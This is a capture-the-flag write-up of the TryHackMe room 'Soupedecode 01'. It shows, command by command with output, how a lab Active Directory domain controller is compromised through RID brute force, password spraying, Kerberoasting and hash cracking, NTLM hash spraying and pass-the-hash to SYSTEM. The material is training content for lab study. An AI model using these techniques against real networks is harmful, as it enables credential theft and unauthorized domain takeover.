---
title: "TryHackMe: Soupedecode 01"
author: jaxafed
categories: [TryHackMe]
tags: [windows, nxc, netexec, ad, active directory, impacket, password spraying, kerberoast, smb, hash spraying, pass-the-hash]
render_with_liquid: false
media_subpath: /images/tryhackme_soupedecode_01/
image:
  path: room_image.webp
---

**Soupedecode 01** was a very simple Active Directory room. We began by enumerating a list of usernames via **RID bruteforce** and subsequently found valid credentials through **password spraying**. After that, using a **Kerberoasting** attack yielded credentials for a service account, granting access to an SMB share containing usernames and NTLM hashes. Finally, by spraying the hashes, we discovered the credentials of an administrator account on the **Domain Controller (DC)** and completed the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/soupedecode01){: .center }

## Initial Enumeration

### Nmap Scan

As usual, we start with a **port scan**.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.67.33
...
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-01 19:46:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-01T19:48:24+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
...
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the port scan, it seems we are dealing with a **Domain Controller**. We also learn the **hostname** and **domain name**, so we add them to our `/etc/hosts` file:

```
10.10.67.33 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL
```
{: file="/etc/hosts" }

### Enumerating SMB Shares

Using `nxc` (`netexec`), we enumerate SMB shares and find that logging in as the `guest` user is permitted and grants us read access to the **IPC$** share.

```console
$ nxc smb dc01.soupedecode.local -u 'guest' -p '' --shares
SMB         10.10.67.33     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\guest:
SMB         10.10.67.33     445    DC01             [*] Enumerated shares
SMB         10.10.67.33     445    DC01             Share           Permissions     Remark
SMB         10.10.67.33     445    DC01             -----           -----------     ------
SMB         10.10.67.33     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.67.33     445    DC01             backup
SMB         10.10.67.33     445    DC01             C$                              Default share
SMB         10.10.67.33     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.67.33     445    DC01             NETLOGON                        Logon server share
SMB         10.10.67.33     445    DC01             SYSVOL                          Logon server share
SMB         10.10.67.33     445    DC01             Users
```

### Discovering Usernames

Leveraging our access to the **IPC$** share, we can perform a **RID bruteforce** attack using `nxc` to enumerate domain users.

```console
$ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000
SMB         10.10.67.33     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\guest:
SMB         10.10.67.33     445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.67.33     445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
...
SMB         10.10.67.33     445    DC01             1000: SOUPEDECODE\DC01$ (SidTypeUser)
SMB         10.10.67.33     445    DC01             1101: SOUPEDECODE\DnsAdmins (SidTypeAlias)
SMB         10.10.67.33     445    DC01             1102: SOUPEDECODE\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.67.33     445    DC01             1103: SOUPEDECODE\bmark0 (SidTypeUser)
...
```

We can also filter the output to create a clean list of usernames and save it to `valid_usernames.txt`.

```console
$ nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 > valid_usernames.txt
```
{: .wrap }

## User Flag

### Password Spraying

With the list of valid usernames, we can attempt **ASREPRoasting**, but no accounts are vulnerable. Also, trying standard password spraying attempts with common passwords (e.g., the domain name, seasons, years) are also unsuccessful. However, another common weak password choice is for a user to set their password to their username. By attempting to authenticate each user with their own username as the password, we successfully identify valid credentials for the user `ybob317`.

```console
$ nxc smb dc01.soupedecode.local -u valid_usernames.txt -p valid_usernames.txt --no-bruteforce --continue-on-success
SMB         10.10.67.33     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS_LOGON_FAILURE
SMB         10.10.67.33     445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS_LOGON_FAILURE
...
SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
...
```

As the `ybob317` user, we have read access to the **Users** share, which we can connect to using `smbclient.py` and retrieve the user flag from `\\dc01.soupedecode.local\Users\ybob317\Desktop\user.txt`.

```console
$ nxc smb dc01.soupedecode.local -u 'ybob317' -p 'ybob317' --shares
SMB         10.10.67.33     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB         10.10.67.33     445    DC01             [*] Enumerated shares
SMB         10.10.67.33     445    DC01             Share           Permissions     Remark
SMB         10.10.67.33     445    DC01             -----           -----------     ------
SMB         10.10.67.33     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.67.33     445    DC01             backup
SMB         10.10.67.33     445    DC01             C$                              Default share
SMB         10.10.67.33     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.67.33     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.67.33     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.67.33     445    DC01             Users           READ
```

```console
$ smbclient.py 'SOUPEDECODE.LOCAL/ybob317:ybob317@dc01.soupedecode.local'

# use Users
# cd ybob317/Desktop
# ls
drw-rw-rw-          0  Fri Jul 25 17:51:44 2025 .
drw-rw-rw-          0  Mon Jun 17 17:24:32 2024 ..
-rw-rw-rw-        282  Mon Jun 17 17:24:32 2024 desktop.ini
-rw-rw-rw-         33  Fri Jul 25 17:51:44 2025 user.txt
# get user.txt
```

## Root Flag

### Kerberoasting

With valid domain credentials, we check for **Kerberoastable** accounts using `GetUserSPNs.py`:

```console
$ GetUserSPNs.py -request -outputfile kerberoastables.txt 'SOUPEDECODE.LOCAL/ybob317:ybob317'

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 17:32:23.726085  <never>
FW/ProxyServer          firewall_svc              2024-06-17 17:28:32.710125  <never>
HTTP/BackupServer       backup_svc                2024-06-17 17:28:49.476511  <never>
HTTP/WebServer          web_svc                   2024-06-17 17:29:04.569417  <never>
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 17:29:18.511871  <never>
```

Now, using either `hashcat` or `john`, we attempt to crack the hashes with the `rockyou.txt` wordlist and successfully discover the password for the `file_svc` account.

```console
$ hashcat kerberoastables.txt /usr/share/wordlists/rockyou.txt

$ hashcat kerberoastables.txt --show
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/file_svc*$d66d...73b6:Pa[REDACTED]!!
```

### Accessing the Backup Share

With the `file_svc` account, we re-enumerate SMB shares and discover that we now have read access to the **backup** share.

```console
$ nxc smb dc01.soupedecode.local -u 'file_svc' -p 'Pa[REDACTED]!!' --shares
SMB         10.10.67.33     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\file_svc:Pa[REDACTED]!!
SMB         10.10.67.33     445    DC01             [*] Enumerated shares
SMB         10.10.67.33     445    DC01             Share           Permissions     Remark
SMB         10.10.67.33     445    DC01             -----           -----------     ------
SMB         10.10.67.33     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.67.33     445    DC01             backup          READ
SMB         10.10.67.33     445    DC01             C$                              Default share
SMB         10.10.67.33     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.67.33     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.67.33     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.67.33     445    DC01             Users
```

Checking the share, we find a single text file named `backup_extract.txt` inside:

```console
$ smbclient.py 'SOUPEDECODE.LOCAL/file_svc:Pa[REDACTED]!!@dc01.soupedecode.local'

# use backup
# ls
drw-rw-rw-          0  Mon Jun 17 17:41:17 2024 .
drw-rw-rw-          0  Fri Jul 25 17:51:20 2025 ..
-rw-rw-rw-        892  Mon Jun 17 17:41:23 2024 backup_extract.txt
# get backup_extract.txt
```

The file contains a list of account names and their corresponding **NTLM hashes**.

```console
$ cat backup_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41d[REDACTED]5559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

### Hash Spraying

We parse the file to create separate lists for **usernames** and **NTLM hashes**.

```console
$ cat backup_extract.txt | cut -d ':' -f 1 > backup_extract_users.txt
$ cat backup_extract.txt | cut -d ':' -f 4 > backup_extract_hashes.txt
```

Now, spraying the hashes using `nxc` with the list of usernames and their corresponding hashes, we discover that the hash for the `FileServer$` account is valid and grants us access.

```console
$ nxc smb dc01.soupedecode.local -u backup_extract_users.txt -H backup_extract_hashes.txt --no-bruteforce --continue-on-success
SMB         10.10.67.33     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
...
SMB         10.10.67.33     445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41d[REDACTED]5559 (Pwn3d!)
...
```

### Administrator Access

Also, the `(Pwn3d!)` tag in the `nxc` output indicates that the `FileServer$` account has administrative privileges on the target, allowing us to use an `impacket` script like `smbexec.py` to execute commands on the **DC** and read the root flag at `C:\Users\Administrator\Desktop\root.txt` to complete the room.


```console
$ smbexec.py -hashes :e41d[REDACTED]5559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
27[REDACTED]6a
```

Alternatively, we could just retrieve the flag via SMB:

```console
$ smbclient.py -hashes :e41d[REDACTED]5559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'

# use C$
# cd Users/Administrator/Desktop
# ls
drw-rw-rw-          0  Fri Jul 25 17:51:20 2025 .
drw-rw-rw-          0  Fri Aug  1 19:40:46 2025 ..
drw-rw-rw-          0  Mon Jun 17 17:41:17 2024 backup
-rw-rw-rw-        282  Sat Jun 15 17:54:32 2024 desktop.ini
-rw-rw-rw-         33  Fri Jul 25 17:51:20 2025 root.txt
```

Lastly, a quick check of the `FileServer$` account’s group memberships shows it belongs to the **Enterprise Admins** group, explaining our administrative access.

```console
C:\Windows\system32>powershell -c (Get-ADComputer "FileServer$" -Properties MemberOf).MemberOf
CN=Enterprise Admins,CN=Users,DC=SOUPEDECODE,DC=LOCAL
```

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
